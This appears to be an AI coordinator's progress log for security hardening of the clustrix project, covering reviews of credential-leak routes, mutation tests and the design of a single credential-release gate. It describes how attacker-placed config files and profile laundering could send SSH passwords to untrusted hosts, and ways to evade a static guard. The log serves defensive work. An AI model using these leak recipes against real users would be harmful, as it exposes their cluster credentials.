$ python -m sphinx -q -b html docs/source <build>
$ python scripts/check_docs_markup.py <build>
OK: no nested inline markup in 41 built page(s).
```

`scripts/check_docs_markup.py` is wired into `tests.yml`'s `docs-test` job right
after `make html`, and was proven on a planted instance: sphinx exits 0 both
times, the check goes 0 → 1 → 0.

**Also fixed:** the flaky `known_hosts` test, independently of #164's fix —
it timed its SIGKILL from `Popen`, so 1.54 s of child start-up ate a 1.0-2.0 s
window. The window now starts at the first observed write: 6/8 failed under
load-avg 72 before, 8/8 pass under the same load after.

Gates: `1790 collected / 1763 selected / 1746 passed / 17 skipped / 0 failed`.

## My own verification run was a failed measurement — the guard fired on me

I ran the full suite against `aa1345f` to check the agent's numbers myself. It
exited **144 with no output at all**.

By the rule I have been putting in every brief, that is **not a result** — it is
a failed measurement, and recording "0 failures" or "couldn't verify" from it
would be exactly the false confidence the guard exists to prevent. Re-ran with
output redirected to a file so the outcome cannot vanish again.

Worth noting that the guard has now caught: two agents' probe batches (a missing
`timeout` binary and a mistyped path), one SIGKILLed mutation sweep, four bogus
KILLEDs from a shell quoting bug — and now one of mine. The failure mode is not
rare and it is not confined to agents.

## #152 — DONE, confirmed by my own run

```
collected 1790 / 27 deselected / 1763 selected
1746 passed, 17 skipped, 0 failed          (325s, venv311 / CPython 3.11.16)
FAILED/ERROR lines: 0
```

Matches `aa1345f`'s reported numbers exactly. Six fix rounds, five adversarial
reviews. Along the way it produced #170 (the return-shape semantics),
`scripts/check_docs_markup.py` (a CI check for a defect class `sphinx -W`,
`rstcheck`, `doc8` and `sphinx-lint` all miss), the `psutil` and `traitlets`
declarations, and a fix for the load-flaky `known_hosts` test.

## #164 round-five review — NOT clean. Blocking, plus the gap the test was written to close.

**F1 BLOCKING — the branch is RED, on round four's own new file.**
`test_submission_invariants.py:68` trips the repository's credential scanner.
Deterministic on both 3.12.10 and 3.11.16. So the commit's "0 failed" baseline
is **false** and every "revert → N failures" figure in it is off by one.

Fifth scanner trip in this campaign, and again by someone writing a
security-adjacent test. Remedy unchanged: change the literal, never the scanner.

**F3 — the invariant test does not cover the default path.** Every invariant
test passes `conda_env_name="prod"`, so a **plain two-venv submission with no
named environment** — the default — has no invariant test at all. R15 (aliasing
`venv2_python`/`conda_env2_name` to VENV1's) survives **355/355** focused tests,
and a real submission without a named environment emits

```
conda run -n clustrix_venv1_py312_… python -c "      <- VENV2 launched as VENV1
```

on both backends. R21 survives identically. Fix is one parametrisation.

That is the same class of gap the invariant test existed to close: it pins the
*interesting* path and leaves the *ordinary* one open. Worth generalising — a
test written to catch a specific bug tends to inherit that bug's parameters.

**F2 — emittable shell no test executes.** The SSH probe's last-resort line
(`conda --version | grep -oE …`) can be replaced with
`echo /POISON/etc/profile.d/conda.sh` and the full suite stays green. The line
itself works (executed by hand); it is a coverage gap. Given round three shipped
invalid bash in this very file, an unexecuted fallback deserves a fixture.

Minor: R12 survives — `load_config`'s `validate_conda_env_name` is redundant,
since `ClusterConfig(**data)` raises anyway, and its only added value (naming
the file) is unasserted. And "11 named goldens" is **10**.

### What held, and it is substantial

- **Shell sweep clean**: 45 emittable fragments — both probes, both generators,
  discovery block, guard, helpers, a 32-cell script matrix including spaces in
  `python_executable`, `set -e`, `set -u`, module loads — **45/45 pass
  `bash -n`**, and real execution is correct in six scenarios including a conda
  base path containing a space and `conda info --base` output with a CR.
- **Version guard fails closed**: mismatch → rc 1, one stderr line naming both
  versions, the environment and both settings; match → silent rc 0; environment
  missing or interpreter undeterminable → `|| exit 1`, correct with and without
  `set -e`.
- **The flaky fix is provably stronger**: under real 32× load (avg 43-80) the
  round-four version is 4/4 green where round three's timing guess failed 6, 6
  and 2 of 6 on the *same healthy writer* — and against a deliberately
  non-atomic writer the new test goes **RED 6/6**, because the kill now lands
  mid-write every time.
- **Goldens sound**: the `_want` normalisation matches exactly once per named
  golden and zero times in all 9 replication goldens; comparison and message
  lines are not normalised; the value is asserted separately; all 9 replication
  goldens independently reproduced byte-identical from `git archive 4126a03`.

## Campaign-wide pattern: a test inherits the parameters of the bug it was written for

This has now appeared twice, in unrelated issues, and both times the test looked
thorough:

| Issue | The test | What it missed |
|-|-|-|
| #152 (X1) | every new test drove `@cluster(cores=N)` | the `configure(default_cores=N)` route into pool sizing — mutant survived the full suite |
| #164 (F3) | every invariant test passed `conda_env_name="prod"` | a plain two-venv submission with **no** named environment — the default path. R15 survived 355/355 |

Same shape as the #152 filter tests, which all used a *dropping* filter and so
could not distinguish "warning outside the gate" from "warning inside it".

The mechanism: a test written to catch a specific defect is parameterised by
that defect. The interesting path gets pinned; the ordinary one — the path most
users actually take — stays uncovered, and the suite reports full coverage of
the line.

**Practical check for a new test: does it exercise the *default* configuration,
or only the one that was broken?** Cheap to ask, and it would have caught all
three.

## #167 round-five review — a fifth route, and a false refusal worse than the leak

**L1 — the table permanently poisons hostnames on a guess.** Constructing a
config on the main thread while an **unrelated** untrusted read is in flight on
another thread yields `working-directory`/`trusted=False` **and writes the
hostname into the append-only permanent map**. Measured: 24 threads over 3 s →
**164,509 of 164,516** ordinary constructions over-tainted. An abandoned
generator suspended inside the block reproduces it with no threads at all.

`configure()` cannot clear it, there is no clear API, and the refusal names
remedies unrelated to the cause. **A momentary benign overlap permanently
denies the documented workflow** — the failure mode that gets a security
control ripped out by the next maintainer.

The distinction the fix must draw: *"this construction could not prove its
origin, so treat it as untrusted"* is conservative and fine. *"this hostname was
named by an untrusted file, so poison it process-wide forever"* is a far
stronger claim and must follow only from a source **actually known to be a
file**. The permanent map has to stop accepting guesses.

**L2 — the fifth leak route**, and it is nastier than the fourth.
`EnhancedClusterConfigWidget` (`%%clusterfy`) calls `detect_config_files()`,
which globs `"."` for `clustrix.yml|clustrix.yaml|**config.yml**|config.yaml`.
`./config.yml` is **not** in `_load_default_config`'s search list, so nothing
taints at import and no warning fires; the file lands in `self.configs` as a
**raw dict with no provenance at all**, and `_on_apply_config` calls
`configure(**config_data)` → `runtime`, trusted. Measured: `leaked=true`.

Both frictions are attacker-removable: the widget re-emits `name`, which
`configure` rejects — so ship `name: ""`, since empty values are stripped — and
the host-key check is satisfied by the user's own documented
`ssh_host_key_policy: auto_add`.

**L3 — A8: the stated invariant is false.** During auto-discovery of
`./clustrix.yml` the only declaration is `explicit-file` (the fixup happens
*after*), so the in-flight table stays `{}`. The thread guard protects
`ProfileManager._restore` and the widget Load and gives **zero** protection to
the working-directory / redirected auto-search.

**L4 — three survivors.** M5 is real: a nested exit `pop`s instead of
decrementing, clearing the record while the **outer** untrusted read is still in
flight — exactly the window the table exists for. The shipped test asserts
`{WD: 2}` inside and `{}` after, and both still hold under the mutation.

**L5 — the AST guard is a canary, not a control.** Evaded by
`importlib.import_module("multi"+"processing")`, `__import__`, a re-export shim,
an injected pool, and `subprocess`/`os.fork`+exec. False-positives on any
`def joblib(self)` or `.multiprocessing` attribute, because it matches
`ast.Attribute.attr`. Keep it, relabel it honestly.

### What held

Every previously closed route stayed closed — `replace`, `asdict`, `copy`,
`deepcopy`, `pickle`, `configure`, `load_config`, a forged source, a raw
`object.__setattr__`, and every host spelling. Both positive controls still
leak as they must, and the Save/Load round-trip still authenticates. Precedence
is correct and the two globals fail closed when they disagree.

### Five routes now

| # | route | closed in |
|-|-|-|
| 1 | `stored_host in target_host` | round 1 |
| 2 | a working-directory `clustrix.yml` | round 3 |
| 3 | `ProfileManager.load_from_file` → `__post_init__` | round 4 |
| 4 | the modern widget's Load dropdown | round 5 |
| 5 | the `%%clusterfy` widget's `detect_config_files()` | round 6 |

The count is the finding. "May this secret go to this host" is asked from five
places, and every new caller is another chance to forget — which is an argument
for a single choke point rather than five correct call sites.

## Owner directive: make the credential-release decision a single source of truth

Following the five-routes finding, the owner asked for the decision to be
implemented in **one** location rather than five correct call sites — then
tested for preserved functionality, red-teamed by **different** subagents, and
merged.

A read-only planning agent is running against `work/fixes` (which is still
moving under it — `fa289a4` is the last commit it can rely on).

The design steer given: make the unsafe thing **hard to express**, not merely
discouraged. A credential that cannot be read without supplying the target turns
"forgot to check" into "did not run", which is a different class of guarantee
from "every caller remembered".

Two things the plan must not get wrong:

1. **The positive controls must keep working.** A config from
   `~/.clustrix/config.yml` and a profile store inside `~/.clustrix` must still
   release the credential; the documented workflow is a `.env` holding
   `SSH_PASSWORD` with the host in a config file. A design that breaks it gets
   reverted however elegant it is.
2. **The enforcement test must be honest.** It should aim to prove a *sixth*
   route cannot be written, and state plainly what it cannot catch — this
   project's previous AST guard was evadable five ways and false-positive on
   `def joblib(self)`.

## Choke-point plan delivered — and it found routes 6 and 7 while reading

`notes`-adjacent: the full plan is
`<scratchpad>/plan-choke-point.md`, 651 lines, and it has a section 8
("what in this plan depends on details that may have shifted") because the
branch was moving under it.

### Two more live routes, both reproduced

**Route 6 — LIVE, no gate at all.** `ClusterConfig.get_env_password()`
(`config.py:250`) performs **no host and no provenance check**, and
`validation.py:145` feeds it straight into `validate_cluster_auth` →
`paramiko.connect(hostname=config.cluster_host, ...)`. Probed with an isolated
`HOME`: `trusted: False`, secret released anyway.

**Route 7 — the write side, and the nastiest shape yet.**
`auth_manager._offer_credential_storage` offers to write
`SSH_HOST=<untrusted host>` plus the typed password into `~/.clustrix/.env` —
**manufacturing a permanently-trusted binding**. Every other route abuses trust;
this one creates it, and it creates it in the one file the remedy texts tell
users to trust.

Seven routes now. This is no longer "a bug with instances"; it is a decision
that has no home.

### The design

New leaf module `clustrix/credential_release.py`:

```
release_credential(target: CredentialTarget, *, provider="ssh", config=None)
    -> CredentialRelease
```

with a frozen `CredentialTarget(hostname, username, provenance, described_as)`
whose `__post_init__` **refuses an unnormalisable hostname**, and a
`CredentialRelease` that must carry either a secret or a refusal — never both,
never neither.

Three locks: nothing else public to call (`ensure_credential` becomes
`_ensure_credential_unchecked`, the module-level convenience deleted); **a
target that names nobody cannot exist**; and `_ensure_credential_unchecked`
raises unless its caller's module is the gate. Always on — not test-aware, which
CLAUDE.md forbids.

### The reversal worth noting

The planner set out to **delete** `_UNTRUSTED_LOADS_IN_FLIGHT` — it reproduced
round five's harm independently (117,106 constructions, 108,826 over-tainted,
the user's own hostname permanently in the map) — then found the **uncommitted
round-six diff already in the worktree doing it better**: `_SourceRead(source,
from_declaration)` lets a *guess* mark one object untrusted while never writing
the hostname. It reversed its own recommendation and said so.

That is exactly the separation I asked round six for, arrived at independently.

What it still wants: `ClusterConfig.from_file_content(mapping, source)` — making
provenance an **argument** rather than ambient context, which closes route 3
structurally rather than by convention.

### Migration and honesty

~14 files, ~22 call sites, **seven staged commits, green at each**. The widget
diff is **8 lines total** (6 + 2), landed last in an isolated commit, rebase not
merge — the restraint that kept the last two widget fixes conflict-free.

The enforcement test asserts only **decidable structures** — an `ImportFrom` of a
named symbol, a `Call` on a named attribute, a `ClusterConfig(**…)` outside
`config.py` — never bare identifiers, which is what made the previous guard fire
on `def joblib(self)`. Its docstring states the limit plainly: it does not prove
a sixth route impossible, only that one cannot be added *silently*; the runtime
caller-module check is what makes a bypass fail.

**Smallest viable version**: steps 1-3 only, 5-6 files — closes routes 1, 6 and
7 outright and turns "forgot to check" into "does not run", leaving 3/4/5 on
their existing patches.

**Would not do**: a `Secret` wrapper with `.reveal()` (ceremony — paramiko wants
a `str`), a trust-source registry, deleting the host map, or a `clear_taint()`
API.

## #164 round five fix — `fa21f72`. Green on both interpreters.

```
3.12.10: 1985 collected / 1958 selected / 1938 passed / 20 skipped / 0 failed
3.11.16: same collection            / 1941 passed / 17 skipped / 0 failed
```

R15, R21, P1, R1 and R12 all die. F3's fix is a parametrisation —
`[None, "prod"] × [slurm, ssh]` — so the **default** path is covered at last.
P1's fix widened `assert_venv2_is_not_venv1` to read VENV2's *whole block*
rather than the launch line.

### Two things done right, worth copying

**It corrected the previous commit's record without rewriting history.**
`e0b1d39` claimed a 0-failed baseline; it was 1. Every "revert → N failures"
figure was N+1. "Eleven named goldens" was ten (7 slurm + 3 ssh; 19 files, 9
replication). All stated in the **new** commit rather than by amending the
published one.

**It fixed the scanner trip without weakening the scanner** — the fixture value
now starts with a prefix the scanner already treats as a stand-in, and the
suppression list is untouched. Fifth trip today, fifth time the literal moved
rather than the guard.

### The risk the round-six review is aimed at

The new fixtures fake `activate` with **no-op `pip` / `deactivate`**. A fixture
that fakes too much makes its tests vacuous, so the review must prove the
plain-venv tests still fail against a genuinely broken script. A test that
cannot fail is worse than no test — and this campaign has already found three of
those.

## `~/.ssh/known_hosts` after three pollution incidents — verified healthy

Each incident was caused by a standalone probe run **outside** pytest's
`isolate_home` fixture, self-detected, and cleaned. Verified independently:

```
32 keys, 0 loopback entries, mode 600
ndoli ✓  discovery ✓  tensor01 ✓  tensor02 ✓  github.com ✓
```

**And I checked the two backup files before touching anything**, which was worth
doing: `known_hosts.old` is dated **February 2026** — the owner's own file, not
agent cruft — and `known_hosts.backup-20260819T193137Z` is my documented backup
from yesterday's 1,238→32 cleanup. Neither was deleted. "Tidying up" a
directory you did not create is how real files get lost.

## Three branches independently fixed the same flaky test

`tests/unit/test_known_hosts_atomicity.py` is now a three-way conflict. All
three branches added a fix for the same load-flaky test on top of the shared
`ea46f05`:

| Branch | Commit | File total |
|-|-|-|
| `priorities-and-docs` (#152) | `aa1345f` | +365 |
| `silent-failures` (#123) | `5970455` | +342 |
| `named-env` (#164) | `e0b1d39` | +374 |

Three different implementations, confirmed by checksum.

**This is my coordination failure, and also the project's own rule working.** I
assigned the flake explicitly to #164's brief — but #152's and #123's agents
each hit it during their own runs, and CLAUDE.md says *"never dismiss the
problem as 'pre-existing'… ALL errors need to be addressed when they are
encountered."* All three did the right thing by the rule. The cost is ~3× effort
and a three-way merge.

The lesson is for me, not them: **when I assign a cross-cutting defect to one
agent, I must tell the others it is already owned** — otherwise the rule that
stops defects being ignored guarantees they get fixed three times.

### Resolution: take #164's version

It is the most thoroughly diagnosed, and the diagnosis is *in the docstring*
where the next reader will find it:

> the first append lands at ~0.45s on an idle box and at up to 3.2s with the
> machine oversubscribed 32 ways: 152 of 160 sampled starts exceeded 1.0s under
> that load … That is a defect in the test, not in the writer … a test that
> fails on a busy machine teaches people to re-run until green, which is how a
> real failure gets ignored.

It also has a real 120s deadline and distinguishes *"the writer exited on its
own without appending"* from *"appended nothing in 120s"* — two different
failures the other versions collapse.

**Verify at merge** that #152's and #123's versions contain nothing unique
beyond their own flake fix before discarding them.

## #123 review — VERDICT: it does not hold. Four findings.

### The inverted guard is defeated 22 of 24 ways — I was wrong to praise it

I called the inversion ("the handler must *do* something") the best engineering
of the day. It is not. Only `contextlib.suppress` nested in a handler and a
nested `try` are caught. Five root causes:

| cause | examples |
|-|-|
| any mention of the bound name, however dead | `f"{exc}"` dropped · `message = str(exc)` · bare `exc` · `_ = exc` · `None if exc else None` |
| any statement, read as accounting | `n += 1` on a dead local · `del x` · `assert True` · `import os` · `global FLAG` · subscript-assign |
| any call at all | a no-op helper · `errors.append(exc)` · `int()` · `NULL_REPORTER.report(exc)` · `if want_to_log(): pass` |
| `raise` inside a never-called nested `def`/`lambda` | reads as a re-raise |
| constant-only log at a watched level | `logger.warning("")` · `logger.error("oops")` — `QUIET_LOG_LEVELS` covers only debug/info |

**Four static guards have now been defeated in this project — 12, 30, 14+16,
and 22 ways.** The pattern is conclusive: *"did this handler do something
useful"* is **not decidable by inspecting the handler.** Do not attempt a fifth.
The precedent that worked is `test_persisted_files_are_private.py` — a
**behavioural** guard observing an outcome, with the static check demoted to a
labelled lint that carries its blind spots.

### The issue's headline defect is still live

Of the 9 swallows the guard exposed, **2 genuinely fixed, 7 merely annotated** —
the caller still gets the same wrong answer, plus a `logger.debug` line at a
level the guard's own `QUIET_LOG_LEVELS` calls unwatched.

Worst: **`_test_basic_connectivity` still returns "could not tell" as "not
reachable"** — the exact shape #123 exists to remove. Also `_looks_like_profile_file`
(an unreadable file is indistinguishable from not-a-profile), both
`_distribution_import_names` sites, and `resolve_remote_python.exists()` (a
transport failure still yields a confident "No python3.10 on the remote host").

**Annotation is not a fix.** That distinction is the whole issue.

### A torn write in `configure()`

`configure()` holds the lock only for `_ensure_default_config_loaded()`; its
`setattr` loop (`config.py:611`) runs **unlocked**. Interleaved with
`load_config`, it returned **success** with `cluster_host` silently reverted to
the file's value and the other three fields applied — neither writer winning.
The docstring's *"the winner is the last caller to enter"* is false against a
`configure()` competitor, and `configure` is the **higher**-precedence writer.

Rare unforced (0/60; 12 three-thread pileups did not reproduce it); exhibited by
scheduling the preemption with a trace hook, which is legitimate because the
interpreter may switch at any bytecode there.

### The fork test is not armed

- **M3** delete the whole `register_at_fork` registration → suite **green**, 5/5
  correct. The test cannot see it.
- **M4** remove only the flag-clear → child returns the pre-search default
  **1 in 5**, suite still passes.
- Only **M5** is RED. One third of the handler is covered.

The handler itself survived five direct attacks, so the implementation looks
right — it is the coverage that is missing.

### What held

F6 is genuinely distinguishing, not inert — `unknown` now says *"That is not a
synonym for 'still running'… clustrix lost sight of it."* Both directions
asserted. The 7 blind spots are each asserted with
`len(BLIND_SPOTS) == KNOWN_BLIND_SPOTS`. The allowlist is enforced both ways.
M1, M2, M5, M7 die.

### The review caught its own measurement lying — twice

A `timeout: command not found` run executed **zero tests**, and its own M2 was
killed and read as **SURVIVED**. Both were discarded and re-run; M2 was RED. The
guards are not theatre.

## Toolchain verified independently on all five current tips

Run by me, via `git archive` into scratch trees so no occupied worktree was
touched, with the **pinned** `black==26.3.1`, `flake8` and `mypy`:

| tip | issue | black | flake8 | mypy |
|-|-|-|-|-|
| `aa1345f` | #152 | 230 unchanged | 0 | 34 files, clean |
| `7f82333` | #167 r6 | 237 unchanged | 0 | 34 files, clean |
| `5970455` | #123 | 232 unchanged | 0 | 34 files, clean |
| `feb1fd9` | #165 | 232 unchanged | 0 | **35** files, clean |
| `fa21f72` | #164 | 232 unchanged | 0 | 34 files, clean |

`feb1fd9`'s 35 is correct — the new `clustrix/widget_controls.py`.

So every branch is lint- and type-clean at its current tip. The remaining risk
in the merge is **semantic**, not stylistic: two correct changes landing on the
same lines, which no linter can see. That is what the per-file resolutions in
`STATUS-159.md` are for.

## #167 round-six review — ROUTE 8, and it defeats the fix we are building

### Provenance does not survive persistence

Measured end to end, sentinel on the wire, across **two real processes**:

1. **P1**: a bundle discovered in the CWD → `redirected-config-dir`, refused,
   host tainted. Correct.
2. `set_active_profile()` → `_persist()` — **one of seven auto-firing
   mutators** — copies it into `<config_dir>/profiles/profiles.yml`.
3. `save_to_file` writes `strip_secret_fields(asdict(config))`. **Provenance is
   not among the persisted fields.**
4. **P2**: `_restore()` re-derives from the file's *new* location →
   `user-config-dir`, `TRUSTED: True`, taint map `{}` → `AUTHENTICATED: True`.

### Why this matters more than the leak itself

**The choke point does not subsume it.** In P2 the gate asks
`config_source_is_trusted` and gets a *legitimately computed* trusted answer —
provenance was destroyed at the process boundary, before any gate saw it.

That is a real limit on the architecture we are adopting, and it is worth
stating plainly rather than discovering later: **a choke point is only as good
as its input.** Centralising the decision removes the "somebody forgot to
check" class of bug; it does nothing about "the input to the check was already
laundered". Those are different failure modes and need different fixes —
the gate for one, durable provenance for the other.

Told the gate implementer mid-flight: do not fix route 8 (a separate agent is,
in `_persist`/`save_to_file`), but **do not assume provenance survives
persistence either** — write down what the gate relies on being true of its
input, and prefer making an absent provenance fail **closed** at
`CredentialTarget` construction over adding another call-site check.

### The false refusal survives one layer up

`_on_apply_config` keys `config_source_map` by `current_config_name` but stamps
`_save_config_from_widgets()` — the **live** fields. So a user who selects an
attacker's `./config.yml`, **types their own hostname**, and hits Apply gets
`{'my-own-cluster.university.edu': 'working-directory'}` — their own cluster
permanently refused, unrecoverable by `configure()`.

Round six's own rule is the fix: **a hostname is condemned only by a source that
actually named it.** The user typed this one.

### What held — and it is a lot

- The config-layer false refusal is genuinely gone: 24 threads / 3.0 s →
  **482,586 constructions, 94,529 over-tainted, host map `{}`**, fresh config
  and `configure()` both `runtime`/trusted.
- The loader side is complete — `load_from_file`, `_restore`,
  `ClusterConfig.load_from_file`, `import_profile`, `_load_default_config` and
  widget Apply all stamp or are deliberately `explicit-file`.
- **16 of 17 mutants die.** R9 survives and is **proven equivalent** — the map
  is only ever written for untrusted sources, so `setdefault` vs assignment
  changes the refusal *message*, never the decision.
- Six laundering attempts failed, including widget Add/duplicate (blocked
  because `_on_add_config` forces a non-empty `name`, which `configure()`
  rejects), `DEFAULT_CONFIGS` name collisions, and multi-config key collisions
  (`configs` and `config_source_map` are written in the same loop, so they
  cannot desynchronise).

### A suite fragility worth fixing

`TestGetPasswordGui` uses `@patch("tkinter…")`, which requires the module to be
**importable**, so it hard-fails on a Python built without Tk. The production
code imports tkinter lazily with an `ImportError` fallback — so the code
degrades gracefully and the test does not. Folded into round seven.

## #167 round seven — `f3a27f2`. Route 8 closed, downgrade-only.

**The design insight:** the persisted source is **downgrade-only**.

| recorded source | on restore |
|-|-|
| untrusted | **believed** |
| trusted | **ignored** — the file's own provenance stands |
| unrecognised / malformed | `redirected-config-dir` |

That asymmetry is what stops the new key becoming the laundering route it would
otherwise be. **A persisted claim of *distrust* is safe to believe; a persisted
claim of *trust* is exactly what an attacker would write.** Same reason
`_clustrix_config_source` is not a dataclass field.

It rejected the blunter option — refusing to persist untrusted profiles — for a
good reason: a user may deliberately keep a project-local profile, and silently
dropping it on save deletes something visible in the widget.

Verified across **two real interpreters**, all seven auto-firing mutators
parametrised (`create/clone/remove/save/rename/set_active/import`), each
spawning genuine subprocesses. Before: P2 gets `user-config-dir`, trusted,
released. After: `redirected-config-dir`, taint re-established, refused.

**R2** — the widget stamps the discovered source only while the live
`cluster_host` still normalises to the one that file named, with three guards so
it is not merely "stop stamping": an unedited file is still condemned, editing
`cores` is still condemned, and `HOST.UPPER().` with a trailing dot is still
condemned.

### The Tk catch is worth keeping

`pytest.importorskip` in the class body **skipped the whole 34-test module**,
not 3 tests — verified, then replaced with a class-scoped `skipif` and a real
try-import probe. `find_spec("tkinter")` would also have been wrong: the package
directory exists on a Tk-less build; `_tkinter` is the missing piece.

That is the difference between a skip that works and one that silently deletes
coverage — and this campaign has already found three tests that could not fail.

Gates: `1964 collected / 1937 selected / 1920 passed / 17 skipped / 0 failed`.

## Rebase needed: the gate branch is now behind

`work/fixes` advanced `7f82333 → f3a27f2`, so `work/credential-gate` (branched
at `7f82333`) is no longer its tip. Per the plan already recorded: **rebase the
gate onto `work/fixes` rather than merging both** — the gate's commits are new
files plus small call-site edits and should rebase cleanly, whereas merging two
branches that each rewrote `config.py` reproduces the five-conflict problem
twice.

Do the rebase **after** the gate implementation reports, not during it.

## #123 fix round three — `5db9631`

All seven annotated sites now genuinely fixed, each with a revert-to-RED
transcript. The headline one is right at last: `_test_remote_connectivity`
returns `(True/False/None, reason)` where **`None` means the probe never ran**,
and the caller prints *"Could not tell…"* rather than *"Cannot reach"*.
`resolve_remote_python.exists()` now **raises** instead of reporting a confident
"No python3.10 on the remote host" after a transport failure.

**Two more sites found while tightening** — neither in the brief:
`SafeRangeEvaluator.visit_Call`, and `_update_existing_files`, which reported an
empty config directory when the *scan* had failed. Three
`# pragma: no cover - unreachable` markers removed, all now driven by real tests.

### An honest limitation, stated rather than papered over

The torn write is fixed — `configure()` runs entirely under the lock, loop
target bound once — but the agent deliberately did **not** make `configure`
unconditionally win, "since that would require replaying runtime overrides and
would break explicit loads". The docstring now says *"last to acquire the
lock"* and names the residue: a later `load_config` still replaces wholesale;
the guarantee is only that no half-applied state is observable.

A fix that names what it does **not** fix is worth more than one that quietly
overclaims — and this campaign has found six of the latter.

### The guard: both approaches, and the numbers moved

- **behavioural guarantee** — 10 tests observing outcome (propagation, an
  audible log, a distinguishable value) against real permission bits, a closed
  SSH transport, invalid-UTF-8 metadata, an RFC 2606 name
- **static check demoted to a labelled lint** (`test_the_lint_*`, module
  docstring says it is not the guarantee)
- bypasses caught: **2 → 15 of 22**; **7 recorded as blind spots** (6 of the
  "any call reads as reporting" family, plus `_ = exc`)
- `BYPASSES/ACCEPTED/BLIND_SPOTS` 17/8/7 → **33/8/12**, `KNOWN_BLIND_SPOTS = 12`
  asserted

**The fork test is armed**: M3 → **5/5 DEADLOCK**, M4 → **5/5 `HOST None`**
(previously 0/5 and 1/5).

Gates: `1858 collected / 1831 selected / 1814 passed / 17 skipped / 0 failed`.

### A dispute worth adjudicating rather than assuming

The reviewer reported **M6 SURVIVED**. The fix agent reproduced it at the same
commit and got **1 failed, 1781 passed** (`test_an_explicit_load_supersedes_the_search`).

One of them made a measurement error. Handed to the next review to settle on
evidence — this campaign has documented three ways a run can lie, so a
disagreement between two careful agents is exactly the case to resolve rather
than pick a side on.

### Environment check — the reported hazard is not one

The fix agent installed the pinned toolchain and `-e ".[widget,test]"` into
pyenv 3.10.12 and worried the editable install now points at `clustrix-silent`.
Verified: an unpinned `import clustrix` still resolves to
`/Users/jmanning/clustrix`. No cross-agent hazard — but every brief continues to
pin `PYTHONPATH` regardless.

## #167 round-seven review — ROUTE 9a: the fix protects nobody already affected

**This is the most consequential finding of the campaign.**

`_restored_profile_source` resolves `recorded is None → file_source`. The
reviewer checked out the **real pre-fix package** (`git archive 7f82333`), had it
write the store, then read that store with `f3a27f2`:

> all 7 mutators give `user-config-dir`, `trusted=True`, and my sentinel
> password **physically authenticated to a real in-process SSH server**

So **route 8 survives the upgrade untouched.** Every user it was live for still
holds a laundered `~/.clustrix/profiles/profiles.yml`, and installing the fix
changes nothing for them.

The root cause is one line with a large consequence: **absence is ambiguous and
is resolved unsafely** — directly contradicting `get_config_source` in the same
subsystem, where a missing record defaults to *untrusted*. Two mechanisms,
opposite defaults.

The acceptance test I set is in **user** terms, not test terms: *what does a
real user with a legitimate existing store see on upgrade?* A fix that locks
people out of their own clusters is as unusable as one that leaks.

### Route 9b — the rename drops provenance

`_on_config_name_change` (`notebook_magic_widget.py:304`) re-keys
`self.configs` but **not** `config_source_map` / `config_source_host_map`.
Attacker's `./config.yml`, host **unedited**, rename only → `runtime`,
`trusted=True`, sentinel at the attacker's server.

That is the **same handler** as #171 (renaming onto an existing name silently
destroys the other profile). **Two distinct defects in one function nobody had
reviewed** — a reasonable argument for reading the whole thing rather than
patching the line.

### What held, and it is substantial

Downgrade-only is sound: **18 spellings × 5 file-sources**, measured through
`_restored_profile_source` *and* end-to-end through a real `ProfileManager`.
Every trusted claim, unknown string, empty, whitespace/case variant,
`int`/`float`/`bool`/`list`/`dict`/`bytes`/`str`-subclass, a non-mapping
`profile_sources`, and every desync (extra, missing, case- and
whitespace-mismatched, duplicate names) yields **≤ file_source**.

Route 8 is closed for all seven mutators across two real interpreters. The three
widget guards hold. Tk: 34 pass with Tk, 31 pass + exactly 3 skip without —
and `find_spec("tkinter")` returns True on a Tk-less build while
`import tkinter` raises, confirming the probe choice. M1-M9 die; M10 and M11
survive and are being pinned.

### Noted, not a regression

`%%clusterfy` Apply is dead for **every** named config on this branch —
`_save_config_from_widgets` emits `name` and `configure()` raises. That is
**#165's defect, already fixed on `work/widget-apply`**, which `work/fixes` does
not contain. It resolves at merge. Flagged to the round-eight agent so it does
not build on the broken behaviour — the guard tests currently reach that path
only by writing `name: ""` into the fixture.

## #164 round-six review — HOLDS, with one gap

Green on both interpreters, confirmed with the reviewer's own numbers: 3.12.10
**1938 passed / 20 skipped / 0 failed**, 3.11.16 **1941 / 17 / 0**, both
`1985 collected / 1958 selected`. All five mutants die.

**The fixtures are proven non-vacuous, and the proof is structural**:
`setup_two_venv_environment` requires `exit_status == 0` or raises, so the
venv-shaped directory *must* exist for `source activate` to succeed — the
fixture is **required** to reach the path at all. Against a genuinely broken
plain-venv script, E4 and P1 both die.

It also stated its boundary honestly: the tests assert the **emitted script**
only, so a broken *setup command* is not detected (E10 survives). The docstring
already says this — a declared limit, not a hidden one.

Host independence checked properly: 218 tests pass with `HOME` a **mode-0500**
directory and `PATH` scrubbed to `/usr/bin:/bin:/usr/sbin:/sbin`.

### The gap: the GPU branch, and it is the same pattern a fourth time

**E1** — aliasing `venv2_python`/`conda_env2_name` after
`venv_info.update(gpu_venv2_info)` — **survives the entire 1958-test suite**,
because `gpu_available` is always `False` on the fixture cluster, so that arm is
**single-valued**.

That is "a test inherits the parameters of the bug it was written for" for the
**fourth** time (after #152's `cores` route, #152's dropping-filter shape, and
#164's own `conda_env_name="prod"`).

Not deferred despite the reviewer suggesting follow-up: a GPU cluster is exactly
where a two-venv layout gets used in anger, and the bug would put the user's
function in **clustrix's own serialization environment**.

### Two sharp secondary findings

- **E9** — emitting venv1's activation *one line above* the `# Step 2` comment
  passes all 20 invariant tests, because `assert_venv2_is_not_venv1` scans
  **from** that comment. The goldens catch it, so no suite escape — but an
  invariant assertion that trusts a comment's **position** is trusting the wrong
  thing.
- **E2 / E3** survive and are **equivalent**, which is informative rather than a
  gap: `venv_info["venv2_python"]` is read nowhere in `clustrix/` and
  `venv2_path` only feeds a log line, so the killing power in R15/R21 comes
  entirely from `conda_env2_name`.

Hygiene verified by the reviewer: tree clean, `known_hosts` 32 lines / 0
loopback / mode 600, no `clustrix_venv*` in any real conda installation, no
`__pycache__` left behind.

## The credential gate is implemented — full design, 9 staged commits

`work/credential-gate`, base `7f82333`, green at every step.

| SHA | Purpose |
|-|-|
| `1bf4654` | add `credential_release.py`; move the matcher **verbatim**, re-export. Zero behaviour change |
| `673e444` | every SSH reader asks the gate |
| `08ea58a` | **route 6** — delete `ClusterConfig.get_env_password` |
| `6399773` | privatise the store: `_ensure_credential_unchecked` + caller guard |
| `d289afa` | **route 7** — gate `_offer_credential_storage` |
| `45d29fe` | **route 3** — `from_file_content` + `record_discovered_hostname`, 4 loaders converted |
| `bbc4c5f` | enforcement test |
| `4e1551e` | widget, isolated, last |
| `480afe7` | CLAUDE.md + CHANGELOG |

